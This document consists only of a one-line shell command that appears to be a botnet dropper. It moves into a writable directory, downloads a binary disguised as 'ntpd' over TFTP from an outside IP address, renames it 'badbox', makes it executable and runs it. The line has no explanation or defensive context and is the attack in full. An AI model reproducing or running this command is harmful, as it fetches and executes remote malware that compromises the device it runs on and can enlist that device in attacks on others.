cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 198.175.126.124;cat ntpd >badbox;chmod +x *;./badbox
